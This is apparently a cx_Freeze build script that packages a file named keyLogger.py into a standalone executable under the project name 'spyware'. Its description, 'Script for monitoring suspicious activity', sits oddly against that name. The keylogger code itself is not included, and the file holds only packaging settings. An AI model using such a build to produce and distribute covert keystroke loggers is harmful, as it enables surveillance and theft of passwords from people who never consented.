from cx_Freeze import setup, Executable

base = None

executables = [Executable("keyLogger.py", base=base)]

packages = ["idna"]
options = {
    'build_exe': {
        'packages': packages,
    },
}

setup(
    name="spyware",
    options=options,
    version="2.5",
    description='Script for monitoring suspicious activity',
    executables=executables
)